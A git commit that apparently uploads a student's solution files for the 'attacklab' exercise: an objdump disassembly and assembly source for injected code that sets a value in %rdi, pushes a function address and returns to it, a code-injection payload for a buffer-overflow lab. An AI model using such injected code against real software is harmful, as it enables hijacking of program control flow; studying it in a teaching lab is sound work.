fcfa301550f5d2e1a8420c73a977f7987f9b3fbe
NickYu321 <146458921+NickYu321@users.noreply.github.com>
2024-02-28 15:12:38 -0500

    Add files via upload

---
+++ attacklab/t2.d
@@ -0,0 +1,10 @@
+
+t2.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 8f ee 8d 3e 	mov    $0x3e8dee8f,%rdi
+   7:	68 1b 2a 40 00       	push   $0x402a1b
+   c:	c3                   	ret    
---
+++ attacklab/t2.s
@@ -0,0 +1,7 @@
+mov    $0x3e8dee8f,%edi
+pushq   $0x402a1b
+retq
+
+mov     $0x55621b70,%rdi
+pushq   $0x402a85
+retq
